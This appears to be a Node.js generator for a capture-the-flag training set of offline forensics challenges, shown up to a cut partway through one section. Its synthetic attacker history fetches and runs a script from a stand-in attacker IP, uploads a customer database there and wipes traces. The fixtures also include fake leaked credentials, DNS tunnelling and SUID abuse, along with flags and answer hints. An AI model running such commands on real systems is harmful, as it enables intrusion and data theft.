// Generates the Operation Nightfall challenge packs.
// Run: node challenges/_tools/generate-operations.mjs
// Each challenge is an offline evidence-analysis exercise — players download files and use their own tools.
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const sha = (s) => crypto.createHash('sha256').update(s).digest('hex');
const write = (rel, content) => {
  const p = path.join(root, rel);
  fs.mkdirSync(path.dirname(p), { recursive: true });
  fs.writeFileSync(p, content);
};
const json = (o) => JSON.stringify(o, null, 2) + '\n';

// Deterministic PRNG (same as calibration generator)
let seed = 0xCAFE_BABE;
const rnd = () => { seed = (Math.imul(seed ^ (seed >>> 15), 0x2c1b3c6d) + 0x297a2d39) >>> 0; return seed / 4294967296; };
const int = (a, b) => a + Math.floor(rnd() * (b - a + 1));
const pick = (arr) => arr[int(0, arr.length - 1)];
const pad2 = (n) => String(n).padStart(2, '0');

// --- Shared synthetic data pools ---
const INTERNAL_IPS = ['192.168.1.45', '192.168.1.102', '192.168.1.78', '192.168.1.201', '192.168.1.150',
  '192.168.1.33', '192.168.1.90', '192.168.1.215', '192.168.1.67', '192.168.1.180'];
const DOMAINS = ['mail.corp.test', 'intranet.nebula.test', 'wiki.nebula.test', 'git.corp.test',
  'jira.corp.test', 'slack.corp.test', 'vpn.nebula.test', 'cdn.nebula.test', 'api.corp.test',
  'ldap.corp.test', 'ntp.pool.test', 'update.vendor.example', 'telemetry.analytics.example',
  'fonts.cdn.example', 'ocsp.pki.example'];
const EXTERNAL_IPS = ['198.51.100.5', '198.51.100.22', '198.51.100.101', '198.51.100.200',
  '203.0.113.10', '203.0.113.55', '203.0.113.88', '192.0.2.10', '192.0.2.50', '192.0.2.100'];

function ts(hour, minute, second = 0) {
  return `2026-10-15T${pad2(hour)}:${pad2(minute)}:${pad2(second)}Z`;
}
function syslogTs(hour, minute, second = 0) {
  return `Oct 15 ${pad2(hour)}:${pad2(minute)}:${pad2(second)}`;
}

// --- Flags ---
const FLAGS = {
  deadDrop:          'RANGE{dns_tunnel_exfil_7a3f}',
  exposedApi:        'RANGE{debug_endpoint_exposed_4e9b}',
  breadcrumbs:       'RANGE{osint_j_morrow_signal_echo}',
  packetStorm:       'RANGE{c2_203_0_113_42_beacon_60s}',
  tokenForge:        'RANGE{jwt_secret_nightfall_cracked}',
  privEscalation:    'RANGE{suid_logmon_shadow_dev01}',
  crimeScene:        'RANGE{intrusion_198_51_100_23_dev01_customer_db}',
  rsaPaper:          'RANGE{textbook_rsa_no_padding_9d2a}',
  containerEscape:   'RANGE{k8s_privileged_hostpid_docker_sock}',
  ticketToRide:      'RANGE{krbtgt_svc_sqldb_golden_ticket}',
  ghostInTheWire:    'RANGE{xor_key_0x5a_flag_recovered}',
  operationBlackout: 'RANGE{blackout_c2_203_0_113_42_exfil_data_nebula}',
};

// ==================== 1. DEAD DROP (network, beginner, 150) ====================
{
  const flag = FLAGS.deadDrop;
  const hexChunks = [];
  const flagHex = Buffer.from(flag).toString('hex');
  for (let i = 0; i < flagHex.length; i += 16) {
    hexChunks.push(flagHex.slice(i, i + 16));
  }

  const lines = ['# DNS Query Log — Edge Resolver nebula-dns-01.internal',
    '# Exported: 2026-10-15 12:00 UTC',
    '# Format: timestamp source type query response', ''];

  // Normal DNS queries
  for (let i = 0; i < 500; i++) {
    const h = int(7, 11);
    const m = int(0, 59);
    const s = int(0, 59);
    const src = pick(INTERNAL_IPS);
    const domain = pick(DOMAINS);
    const resp = pick(EXTERNAL_IPS);
    const qtype = pick(['A', 'A', 'A', 'A', 'AAAA', 'CNAME', 'MX']);
    lines.push(`${ts(h, m, s)} ${src} ${qtype} ${domain} ${resp}`);
  }

  // Insert exfiltration queries (from the compromised host 192.168.1.201)
  const exfilInsertPoint = 300 + int(0, 50);
  for (let i = 0; i < hexChunks.length; i++) {
    lines.splice(exfilInsertPoint + i, 0,
      `${ts(9, 14, 33 + i)} 192.168.1.201 TXT ${hexChunks[i]}.exfil.nebula.test NXDOMAIN`);
  }

  // Sort by timestamp for realism
  const header = lines.splice(0, 4);
  lines.sort();
  const content = [...header, ...lines].join('\n') + '\n';

  write('dead-drop/files/dns-queries.log', content);
  write('dead-drop/challenge.json', json({
    id: 'dead-drop',
    title: 'Dead Drop',
    category: 'network',
    difficulty: 'beginner',
    points: 150,
    mission: 'Operation Nightfall',
    tags: ['dns', 'exfiltration', 'hex'],
    summary: 'Suspicious DNS queries are hiding data in plain sight. Decode the payload.',
    briefing: `NebulaCorp's edge DNS resolver logged a burst of unusual queries. Normal internal traffic queries known corporate domains, but a handful of queries resolve subdomains of "exfil.nebula.test" — a domain that does not exist in the corporate zone.\n\nThe subdomain labels look like hex-encoded data. If someone is tunnelling information out through DNS, the payload is in those labels.\n\nExtract every query to *.exfil.nebula.test, concatenate the subdomain labels (the part before ".exfil.nebula.test") in chronological order, and decode the hex to recover the hidden message.\n\nThe decoded message is a flag. Submit it exactly as it appears.`,
    objectives: [
      'Filter the DNS log for queries to *.exfil.nebula.test',
      'Extract the hex-encoded subdomain labels',
      'Concatenate them in timestamp order and decode from hex',
      'Submit the decoded flag'
    ],
    tools: ['grep', 'awk', 'xxd', 'CyberChef'],
    hints: [
      { title: 'Filter pattern', text: 'grep "exfil.nebula.test" dns-queries.log isolates the suspicious queries. The subdomain label is the first dot-separated segment of the query name.', cost: 20 },
      { title: 'Decode method', text: 'After extracting the hex labels, concatenate them into one string and run: echo "<hex>" | xxd -r -p', cost: 30 }
    ],
    requires: ['ledger-audit'],
    flag: { type: 'static', sha256: sha(flag) },
    artifacts: [{ file: 'dns-queries.log', description: 'Edge resolver query log, ~500 entries.' }],
  }));
  console.log('  dead-drop');
}

// ==================== 2. EXPOSED API (web, beginner, 150) ====================
{
  const flag = FLAGS.exposedApi;
  const logLines = [];
  const paths = ['/', '/api/v1/users', '/api/v1/products', '/api/v1/orders', '/assets/main.css',
    '/assets/app.js', '/favicon.ico', '/api/v1/health', '/login', '/dashboard',
    '/api/v1/search?q=widget', '/api/v1/products/42', '/api/v1/users/me'];
  const methods = ['GET', 'GET', 'GET', 'GET', 'POST', 'GET'];
  const agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'curl/8.4.0',
    'python-requests/2.31.0',
  ];

  for (let i = 0; i < 300; i++) {
    const h = int(7, 11);
    const m = int(0, 59);
    const s = int(0, 59);
    const ip = pick(INTERNAL_IPS);
    const p = pick(paths);
    const method = pick(methods);
    const status = p.includes('health') ? 200 : pick([200, 200, 200, 200, 304, 301]);
    const size = int(200, 15000);
    const agent = pick(agents);
    logLines.push(`${ip} - - [15/Oct/2026:${pad2(h)}:${pad2(m)}:${pad2(s)} +0000] "${method} ${p} HTTP/1.1" ${status} ${size} "-" "${agent}"`);
  }

  // The suspicious request — debug endpoint returning 200
  logLines.splice(180, 0,
    `192.168.1.201 - - [15/Oct/2026:09:22:17 +0000] "GET /api/debug/config HTTP/1.1" 200 847 "-" "curl/8.4.0"`);
  // Also add a few 403s to show it SHOULD be blocked
  logLines.splice(50, 0,
    `192.168.1.45 - - [15/Oct/2026:08:15:33 +0000] "GET /api/debug/config HTTP/1.1" 403 12 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"`);
  logLines.splice(100, 0,
    `192.168.1.78 - - [15/Oct/2026:08:42:01 +0000] "GET /api/debug/config HTTP/1.1" 403 12 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"`);

  write('exposed-api/files/access.log', logLines.join('\n') + '\n');

  const debugResponse = JSON.stringify({
    status: 'ok',
    environment: 'production',
    database: 'postgres://app_user:Pr0d_s3cure!@db.internal.nebula.test:5432/nebula_prod',
    redis: 'redis://cache.internal.nebula.test:6379/0',
    api_key: 'sk-live-nebula-f8a3b2d1e4c7956d',
    jwt_secret: 'super-secret-prod-key-DO-NOT-SHARE',
    flag: flag,
    debug_mode: true,
    build: 'nebula-api-v2.14.3-rc1',
    deployed_at: '2026-10-14T22:30:00Z',
  }, null, 2);

  write('exposed-api/files/debug-response.json', debugResponse + '\n');

  write('exposed-api/challenge.json', json({
    id: 'exposed-api',
    title: 'Exposed API',
    category: 'web',
    difficulty: 'beginner',
    points: 150,
    mission: 'Operation Nightfall',
    tags: ['http', 'access-log', 'api'],
    summary: 'An API debug endpoint is leaking sensitive configuration in production.',
    briefing: `NebulaCorp's web application firewall flagged an anomaly: the /api/debug/config endpoint should return 403 to all callers, but the access log shows at least one successful 200 response.\n\nYou have two files:\n- access.log — the HTTP access log from the production reverse proxy\n- debug-response.json — the response body captured by the WAF for the anomalous 200 request\n\nExamine both files. The response body contains leaked secrets, including a flag. Find it and submit it.`,
    objectives: [
      'Find the 200-status request to /api/debug/config in the access log',
      'Note the source IP and user agent of the successful request',
      'Read the captured response body for leaked secrets',
      'Submit the flag from the response'
    ],
    tools: ['grep', 'jq', 'curl', 'less'],
    hints: [
      { title: 'Narrow the search', text: 'grep "debug/config" access.log shows all requests to that endpoint. Compare the status codes.', cost: 15 },
      { title: 'Response file', text: 'The flag is a JSON field in debug-response.json. Use jq or just read the file.', cost: 25 }
    ],
    requires: ['ledger-audit'],
    flag: { type: 'static', sha256: sha(flag) },
    artifacts: [
      { file: 'access.log', description: 'HTTP access log from the production reverse proxy (~300 entries).' },
      { file: 'debug-response.json', description: 'Captured response body from the anomalous request.' }
    ],
  }));
  console.log('  exposed-api');
}

// ==================== 3. BREADCRUMBS (osint, beginner, 150) ====================
{
  const flag = FLAGS.breadcrumbs;

  const forumPost = `== NebulaSec Forum — Subtopic: Vulnerability Research ==
Thread: Gateway firmware analysis — anyone else looking at this?

Posted by: signal_echo | 2026-10-10 14:23 UTC

I have been analyzing the NebulaCorp gateway firmware (v3.8.2) and found an
undocumented management API on port 8443. The endpoint accepts unauthenticated
requests if you send the right vendor header.

I documented my findings but I am not posting them publicly yet. DM me on the
forum or reach out to my research group — we go by "J.Morrow Research" on Signal.

I will present the full chain at the next NebulaSec meetup in Portland.

-- signal_echo
   PGP: 0xA44F (keyserver: keys.nebula-research.test)

---
Reply by: fw_reversing_fan | 2026-10-10 15:01 UTC

Interesting. I noticed signal_echo also published a paper on embedded extraction
techniques last month. The WHOIS for their research domain might have more info
if you want to collaborate.
`;

  const emailHeaders = `Return-Path: <j.morrow@nebula-research.test>
Received: from mx1.nebula-research.test (198.51.100.77)
    by mail.nebulasec-forum.test (192.0.2.10)
    with ESMTPS id 4Xk2Mn1R0Yz
    for <submissions@nebulasec-forum.test>;
    Sat, 10 Oct 2026 15:01:33 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; d=nebula-research.test; s=sel1;
    h=from:to:subject:date;
    b=pK3mZxQ9wN8fT2vR...
From: Jordan Morrow <j.morrow@nebula-research.test>
To: submissions@nebulasec-forum.test
Subject: Re: Gateway Analysis — Initial Findings
Date: Sat, 10 Oct 2026 15:01:33 +0000
Message-ID: <20261010-jmorrow-signal-echo@nebula-research.test>
X-Mailer: Thunderbird 115.4.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

Attached my initial write-up. Please review before I post the full thread.

Regards,
Jordan
`;

  const socialProfile = `=== Cached Profile: Professional Network (nebula-research.test/~jmorrow) ===
Last cached: 2026-10-12

Name:     Jordan Morrow
Title:    Security Researcher
Org:      NebulaCorp — Research Division
Location: Portland, OR

About:
  Reverse engineer and vulnerability researcher focused on embedded systems
  security. Previously worked on IoT firmware analysis at Tidewater Labs.

Handles:
  Forum:    signal_echo (NebulaSec Forum)
  Git:      j.morrow (git.corp.test)
  Email:    j.morrow@nebula-research.test

Publications:
  - "Gateway Firmware Extraction Techniques" (Oct 2026)
  - "Side-Channel Timing in Low-Power SoCs" (Jul 2026)

PGP Fingerprint: 0xA44F B32C 91DE ...
`;

  const whoisLookup = `% WHOIS query for nebula-research.test
% This is synthetic data.

Domain Name: nebula-research.test
Registry Domain ID: D12345678-TEST
Registrar: Example Registrar Inc.
Updated Date: 2026-08-20T00:00:00Z
Creation Date: 2025-03-15T00:00:00Z

Registrant Name: Jordan Morrow
Registrant Organization: NebulaCorp Research Division
Registrant Street: 1400 Signal Way
Registrant City: Portland
Registrant State: OR
Registrant Postal Code: 97201
Registrant Country: US
Registrant Email: j.morrow@nebula-research.test

Name Server: ns1.nebula-research.test
Name Server: ns2.nebula-research.test
`;

  write('breadcrumbs/files/forum-post.txt', forumPost);
  write('breadcrumbs/files/email-headers.txt', emailHeaders);
  write('breadcrumbs/files/social-profile.txt', socialProfile);
  write('breadcrumbs/files/whois-lookup.txt', whoisLookup);

  write('breadcrumbs/challenge.json', json({
    id: 'breadcrumbs',
    title: 'Breadcrumbs',
    category: 'osint',
    difficulty: 'beginner',
    points: 150,
    mission: 'Operation Nightfall',
    tags: ['osint', 'correlation', 'attribution'],
    summary: 'Correlate fragments across four documents to identify a researcher and their alias.',
    briefing: `NebulaCorp's threat intelligence team intercepted four documents related to a vulnerability disclosure that may affect corporate infrastructure. The documents come from different sources and each contains partial information about the researcher involved.\n\nYour task: correlate the information across all four documents to identify the researcher's real name and their forum handle.\n\nSubmit your finding as RANGE{osint_<first_initial>_<last_name_lowercase>_<forum_handle>}\n\nFor example, if the researcher were Alex Chen with handle "rev_ninja", the flag would be RANGE{osint_a_chen_rev_ninja}.`,
    objectives: [
      'Read all four documents and note identifying details',
      'Cross-reference names, handles, email addresses and organizations',
      'Identify the researcher and their forum handle',
      'Format and submit the flag'
    ],
    tools: ['grep', 'less', 'text-editor'],
    hints: [
      { title: 'Start with the email', text: 'The email headers contain both a real name (From:) and a forum handle (Message-ID). Cross-reference these with the other documents.', cost: 20 },
      { title: 'Name format', text: 'The researcher\'s first name starts with J. Their last name is in the email From header. The forum handle appears in the forum post signature.', cost: 35 }
    ],
    requires: ['ledger-audit'],
    flag: { type: 'static', sha256: sha(flag) },
    artifacts: [
      { file: 'forum-post.txt', description: 'NebulaSec Forum thread excerpt.' },
      { file: 'email-headers.txt', description: 'Intercepted email headers and partial body.' },
      { file: 'social-profile.txt', description: 'Cached professional network profile.' },
      { file: 'whois-lookup.txt', description: 'WHOIS record for a research domain.' }
    ],
  }));
  console.log('  breadcrumbs');
}

// ==================== 4. PACKET STORM (network, intermediate, 250) ====================
{
  const flag = FLAGS.packetStorm;
  const header = 'timestamp,src_ip,src_port,dst_ip,dst_port,proto,bytes_out,bytes_in,duration_ms';
  const rows = [];

  // Normal traffic: various internal hosts talking to external servers, varied sizes and intervals
  for (let i = 0; i < 800; i++) {
    const h = int(7, 11);
    const m = int(0, 59);
    const s = int(0, 59);
    const ms = int(0, 999);
    const src = pick(INTERNAL_IPS.filter(ip => ip !== '192.168.1.201'));
    const sport = int(32768, 65535);
    const dst = pick(EXTERNAL_IPS);
    const dport = pick([80, 443, 443, 443, 8080, 53]);
    const bout = int(100, 50000);
    const bin = int(200, 200000);
    const dur = int(50, 30000);
    rows.push(`${ts(h, m, s)}.${String(ms).padStart(3, '0')},${src},${sport},${dst},${dport},TCP,${bout},${bin},${dur}`);
  }

  // C2 beacon: 192.168.1.201 → 203.0.113.42:443 every ~60s, small consistent payloads
  for (let minute = 0; minute < 180; minute++) {
    const h = 8 + Math.floor(minute / 60);
    const m = minute % 60;
    const jitter = int(-2, 2);
    const s = Math.max(0, Math.min(59, 0 + jitter));
    const bout = 200 + int(-15, 15);    // ~200 bytes, very consistent
    const bin = 180 + int(-12, 12);      // ~180 bytes back
    const dur = 400 + int(-30, 30);      // ~400ms
    const sport = 51000 + minute;
    rows.push(`${ts(h, m, s)}.000,192.168.1.201,${sport},203.0.113.42,443,TCP,${bout},${bin},${dur}`);
  }

  // Also add some normal traffic FROM 192.168.1.201 to other servers (to make it less obvious)
  for (let i = 0; i < 40; i++) {
    const h = int(7, 11);
    const m = int(0, 59);
    const s = int(0, 59);
    const dst = pick(EXTERNAL_IPS.filter(ip => ip !== '203.0.113.42'));
    const dport = pick([80, 443, 8080]);
    const bout = int(500, 20000);
    const bin = int(1000, 100000);
    const dur = int(100, 5000);
    rows.push(`${ts(h, m, s)}.${int(0, 999)},192.168.1.201,${int(32768, 65535)},${dst},${dport},TCP,${bout},${bin},${dur}`);
  }

  rows.sort();
  write('packet-storm/files/netflow-export.csv', [header, ...rows].join('\n') + '\n');

  write('packet-storm/challenge.json', json({
    id: 'packet-storm',
    title: 'Packet Storm',
    category: 'network',
    difficulty: 'intermediate',
    points: 250,
    mission: 'Operation Nightfall',
    tags: ['netflow', 'c2', 'beaconing', 'traffic-analysis'],
    summary: 'One internal host is beaconing to an external server at a suspiciously regular interval.',
    briefing: `NebulaCorp's SOC exported three hours of network flow data from the perimeter firewall. Analysts suspect that a compromised workstation is communicating with a command-and-control server, but the traffic is mixed with thousands of legitimate HTTPS connections.\n\nC2 beacons typically stand out because of their regularity: the same internal host contacts the same external IP at a consistent interval, with similar small payload sizes, regardless of user activity.\n\nAnalyze the flow data to find the beaconing pattern. Identify the C2 server IP and the approximate beacon interval.\n\nSubmit your finding as RANGE{c2_<external_ip_with_underscores>_beacon_<interval>s}\n\nFor example, if host 10.0.0.5 beacons to 1.2.3.4 every 30 seconds: RANGE{c2_1_2_3_4_beacon_30s}`,
    objectives: [
      'Identify internal-to-external connections with regular timing',
      'Look for consistent small payload sizes that suggest beaconing',
      'Determine the C2 server IP address',
      'Calculate the beacon interval in seconds',
      'Format and submit the flag'
    ],
    tools: ['awk', 'sort', 'python3', 'Excel', 'Wireshark-stats'],
    hints: [
      { title: 'Counting connections', text: 'Group flows by (src_ip, dst_ip) pair and count occurrences. The C2 pair will have far more connections than normal browsing patterns to a single destination.', cost: 30 },
      { title: 'Narrow it down', text: 'The beacon source is 192.168.1.201. Filter for that IP and look at which destination has connections every minute.', cost: 50 }
    ],
    requires: ['dead-drop'],
    flag: { type: 'static', sha256: sha(flag) },
    artifacts: [{ file: 'netflow-export.csv', description: 'Three hours of perimeter firewall flow data (~1000 entries).' }],
  }));
  console.log('  packet-storm');
}

// ==================== 5. TOKEN FORGE (web, intermediate, 300) ====================
{
  const flag = FLAGS.tokenForge;
  const jwtSecret = 'nightfall';

  // Build a valid JWT
  const b64url = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');
  const jwtHeader = { alg: 'HS256', typ: 'JWT' };
  const jwtPayload = {
    sub: 'guest_4281',
    role: 'viewer',
    iat: 1729008000,
    exp: 1729094400,
    iss: 'nebula-auth.corp.test',
    note: 'This token grants read-only access. Admin tokens use a different secret... or do they?',
  };
  const headerB64 = b64url(jwtHeader);
  const payloadB64 = b64url(jwtPayload);
  const sigInput = `${headerB64}.${payloadB64}`;
  const signature = crypto.createHmac('sha256', jwtSecret).update(sigInput).digest('base64url');
  const jwt = `${sigInput}.${signature}`;

  write('token-forge/files/captured-token.txt',
    `# Captured from HTTP Authorization header during traffic analysis\n# Source: 192.168.1.201 → api.corp.test:443\n# Timestamp: 2026-10-15T09:30:00Z\n\n${jwt}\n`);

  // Wordlist with the secret buried in it
  const words = [
    'password', 'admin', 'secret', 'letmein', 'welcome', 'monkey', 'dragon',
    'master', 'qwerty', 'login', 'princess', 'shadow', 'sunshine', 'trustno1',
    'iloveyou', 'batman', 'football', 'charlie', 'access', 'hello', 'thunder',
    'midnight', 'phoenix', 'nebula', 'starlight', 'darkside', 'override',
    'nightfall', // <-- the actual secret
    'quantum', 'cipher', 'blackout', 'sentinel', 'vanguard', 'spectre',
    'horizon', 'eclipse', 'cascade', 'fortress', 'rampart', 'bastion',
    'operation', 'protocol', 'keystone', 'gateway', 'firewall', 'exploit',
    'payload', 'beacon', 'hunter', 'warden',
  ];
  write('token-forge/files/common-secrets.txt', words.join('\n') + '\n');

  write('token-forge/challenge.json', json({
    id: 'token-forge',
    title: 'Token Forge',
    category: 'web',
    difficulty: 'intermediate',
    points: 300,
    mission: 'Operation Nightfall',
    tags: ['jwt', 'hmac', 'authentication', 'brute-force'],
    summary: 'A captured JWT was signed with a weak secret. Crack it.',
    briefing: `During traffic analysis, a JWT bearer token was captured from a request to NebulaCorp's internal API.\n\nThe token uses HMAC-SHA256 (HS256) signing, which means the same secret key is used to both create and verify the signature. If the secret is weak enough to brute-force, anyone with the token and the secret can forge new tokens with elevated privileges.\n\nYou are given the captured token and a wordlist of commonly used signing secrets. Your task:\n\n1. Decode the JWT header and payload (they are Base64URL-encoded, not encrypted)\n2. Identify the signing algorithm\n3. Try each word in the provided wordlist as the HMAC-SHA256 key\n4. When you find the correct secret (the signature matches), you have cracked the token\n\nSubmit: RANGE{jwt_secret_<the_secret>_cracked}\n\nFor example, if the secret were "admin123": RANGE{jwt_secret_admin123_cracked}`,
    objectives: [
      'Decode the JWT header and payload (Base64URL)',
      'Confirm the algorithm is HS256',
      'Brute-force the HMAC secret using the wordlist',
      'Submit the flag with the discovered secret'
    ],
    tools: ['python3', 'CyberChef', 'jwt-tool', 'hashcat'],
    hints: [
      { title: 'JWT structure', text: 'A JWT has three parts separated by dots: header.payload.signature. The first two are Base64URL-encoded JSON. Decode them with: echo "<part>" | base64 -d (you may need to add padding).', cost: 25 },
      { title: 'Verification script', text: 'In Python: import hmac, hashlib, base64; sig = hmac.new(secret.encode(), (header_b64 + "." + payload_b64).encode(), hashlib.sha256).digest(); compare base64url(sig) to the third JWT segment.', cost: 50 }
    ],
    requires: ['exposed-api'],
    flag: { type: 'static', sha256: sha(flag) },
    artifacts: [
      { file: 'captured-token.txt', description: 'Intercepted JWT bearer token.' },
      { file: 'common-secrets.txt', description: 'Wordlist of ~50 commonly used signing secrets.' }
    ],
  }));
  console.log('  token-forge');
}

// ==================== 6. PRIV ESCALATION (linux, intermediate, 250) ====================
{
  const flag = FLAGS.privEscalation;

  const findSuid = `# find / -perm -4000 -type f 2>/dev/null
# Executed on nebula-ws01 by incident responder
# Timestamp: 2026-10-15T10:00:00Z

/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
/usr/bin/pkexec
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/opt/nebula/logmon
`;

  const bashHistory = `# Recovered bash_history for user: dev01
# Host: nebula-ws01
# Note: timestamps reconstructed from syslog correlation

whoami
id
uname -a
cat /etc/os-release
ls -la /home/
ls -la /opt/
ls -la /opt/nebula/
file /opt/nebula/logmon
ls -la /opt/nebula/logmon
strings /opt/nebula/logmon | grep -i usage
/opt/nebula/logmon --help
/opt/nebula/logmon --read /var/log/syslog
/opt/nebula/logmon --read /var/log/auth.log
/opt/nebula/logmon --read /etc/shadow
cat /tmp/logmon_out.txt
grep svc_backup /tmp/logmon_out.txt
rm /tmp/logmon_out.txt
history -c
`;

  const syslogExtract = `# Extracted syslog entries for nebula-ws01 around the incident window
# Filtered for user dev01 and logmon activity

Oct 15 09:28:00 nebula-ws01 systemd[1]: Started Session 42 of user dev01.
Oct 15 09:28:05 nebula-ws01 sshd[4501]: pam_unix(sshd:session): session opened for user dev01(uid=1001) by (uid=0)
Oct 15 09:30:10 nebula-ws01 sudo[4515]: dev01 : command not allowed ; TTY=pts/0 ; PWD=/home/dev01 ; USER=root ; COMMAND=/bin/cat /etc/shadow
Oct 15 09:31:00 nebula-ws01 logmon[4521]: started by uid=1001 (dev01)
Oct 15 09:31:00 nebula-ws01 logmon[4521]: reading /var/log/syslog — access granted (suid root)
Oct 15 09:31:45 nebula-ws01 logmon[4522]: started by uid=1001 (dev01)
Oct 15 09:31:45 nebula-ws01 logmon[4522]: reading /var/log/auth.log — access granted (suid root)
Oct 15 09:32:30 nebula-ws01 logmon[4523]: started by uid=1001 (dev01)
Oct 15 09:32:30 nebula-ws01 logmon[4523]: reading /etc/shadow — access granted (suid root)
Oct 15 09:32:30 nebula-ws01 logmon[4523]: output written to /tmp/logmon_out.txt
Oct 15 09:33:15 nebula-ws01 logmon[4523]: process exited normally
`;

  const lsDetails = `# ls -la /opt/nebula/
total 48
drwxr-xr-x 2 root   root    4096 Sep  1 12:00 .
drwxr-xr-x 4 root   root    4096 Sep  1 12:00 ..
-rwsr-xr-x 1 root   root   35280 Sep  1 12:00 logmon
-rw-r--r-- 1 root   root     412 Sep  1 12:00 logmon.conf

# file /opt/nebula/logmon
/opt/nebula/logmon: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
  dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
  BuildID[sha1]=a3f2b1c8..., for GNU/Linux 3.2.0, not stripped

# strings /opt/nebula/logmon | grep -i -E "(usage|read|file|help)"
Usage: logmon [--read <filepath>] [--help]
Reading file: %s
Output written to /tmp/logmon_out.txt
Error: cannot open file
logmon v1.2 — NebulaCorp internal log monitoring tool
`;

  write('priv-escalation/files/find-suid.txt', findSuid);
  write('priv-escalation/files/bash-history.txt', bashHistory);
  write('priv-escalation/files/syslog-extract.txt', syslogExtract);
  write('priv-escalation/files/ls-details.txt', lsDetails);

  write('priv-escalation/challenge.json', json({
    id: 'priv-escalation',
    title: 'Privilege Escalation',
    category: 'linux',
    difficulty: 'intermediate',
    points: 250,
    mission: 'Operation Nightfall',
    tags: ['suid', 'linux', 'privilege-escalation', 'forensics'],
    summary: 'A non-standard SUID binary was abused to read a sensitive file. Reconstruct what happened.',
    briefing: `Incident responders recovered forensic artifacts from a compromised NebulaCorp workstation. A low-privilege user account was able to read /etc/shadow — a file normally readable only by root.\n\nThe responders collected:\n- The output of find / -perm -4000 (SUID binaries)\n- The user's recovered bash history\n- Relevant syslog entries\n- Directory listing and file details for a suspicious binary\n\nAnalyze these artifacts to determine:\n1. Which SUID binary does NOT belong to the standard OS installation?\n2. What sensitive file was read through it?\n3. Which user account exploited it?\n\nSubmit: RANGE{suid_<binary_name>_<sensitive_file_basename>_<username>}\n\nFor example, if the binary were /opt/tools/helper, the file /etc/passwd, and the user admin1: RANGE{suid_helper_passwd_admin1}`,
    objectives: [
      'Identify the non-standard SUID binary from the find output',
      'Trace how it was used in the bash history',
      'Confirm the sensitive file access in syslog',
      'Format and submit the flag'
    ],
    tools: ['grep', 'less', 'text-editor'],
    hints: [
      { title: 'Standard vs custom', text: 'Standard SUID binaries live in /usr/bin/ and /usr/lib/. Look for one in an unusual location like /opt/.', cost: 20 },
      { title: 'Trace the attack', text: 'The binary is /opt/nebula/logmon. The bash history shows it was used with --read /etc/shadow. The user is dev01.', cost: 45 }
    ],
    requires: ['ledger-audit'],
    flag: { type: 'static', sha256: sha(flag) },
    artifacts: [
      { file: 'find-suid.txt', description: 'Output of find / -perm -4000 on the compromised host.' },
      { file: 'bash-history.txt', description: 'Recovered bash history for the suspect user.' },
      { file: 'syslog-extract.txt', description: 'Syslog entries around the incident window.' },
      { file: 'ls-details.txt', description: 'File details for the suspicious binary.' }
    ],
  }));
  console.log('  priv-escalation');
}

// ==================== 7. CRIME SCENE (forensics, intermediate, 300) ====================
{
  const flag = FLAGS.crimeScene;
  const attackerIp = '198.51.100.23';

  const authLog = [];
  // Normal SSH activity (before the attack)
  for (let i = 0; i < 20; i++) {
    const h = int(6, 8);
    const m = int(0, 59);
    const s = int(0, 59);
    const user = pick(['jsmith', 'agarcia', 'mchen']);
    const ip = pick(['192.168.1.45', '192.168.1.102', '192.168.1.78']);
    authLog.push(`${syslogTs(h, m, s)} nebula-ws01 sshd[${int(3000, 3200)}]: Accepted publickey for ${user} from ${ip} port ${int(49000, 65000)} ssh2`);
  }

  // Brute force attempts from attacker
  const targets = ['admin', 'root', 'ubuntu', 'deploy', 'jenkins', 'postgres', 'www-data', 'backup', 'test', 'dev01'];
  let attemptPid = 3300;
  for (const target of targets) {
    const attempts = target === 'dev01' ? int(3, 6) : int(2, 5);
    for (let a = 0; a < attempts; a++) {
      const s = int(0, 59);
      authLog.push(`${syslogTs(8, 45 + Math.floor(attemptPid / 100) % 3, s)} nebula-ws01 sshd[${attemptPid}]: Failed password for ${target === 'deploy' || target === 'test' ? 'invalid user ' + target : target} from ${attackerIp} port ${int(49000, 65000)} ssh2`);
      attemptPid++;
    }
  }

  // Successful login as dev01
  authLog.push(`${syslogTs(8, 47, 12)} nebula-ws01 sshd[${attemptPid}]: Accepted password for dev01 from ${attackerIp} port 49835 ssh2`);
  authLog.push(`${syslogTs(8, 47, 12)} nebula-ws01 sshd[${attemptPid}]: pam_unix(sshd:session): session opened for user dev01(uid=1001) by (uid=0)`);

  // Normal activity continues in background
  for (let i = 0; i < 10; i++) {
    const m = int(48, 59);
    const s = int(0, 59);
    authLog.push(`${syslogTs(9, m, s)} nebula-ws01 CRON[${int(5000, 5100)}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)`);
  }

  authLog.sort();
  write('crime-scene/files/auth.log', authLog.join('\n') + '\n');

  const bashHistory = `# Recovered bash_history — user: dev01 — host: nebula-ws01
# Attacker session (post-compromise activity)
whoami
id
uname -a
cat /etc/os-release
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ls /var/spool/cron/crontabs/
wget http://${attackerIp}:8080/tools.sh -O /tmp/.tools.sh
chmod +x /tmp/.tools.sh
bash /tmp/.tools.sh
/opt/nebula/logmon --read /etc/shadow
ls -la /var/lib/nebula-app/
ls -la /var/lib/nebula-app/backups/
tar czf /tmp/.backup.tar.gz /var/lib/nebula-app/backups/customer-db.sql
curl -s -X POST http://${attackerIp}:9090/upload -F "data=@/tmp/.backup.tar.gz"
rm -f /tmp/.tools.sh /tmp/.backup.tar.gz /tmp/logmon_out.txt
history -c
`;

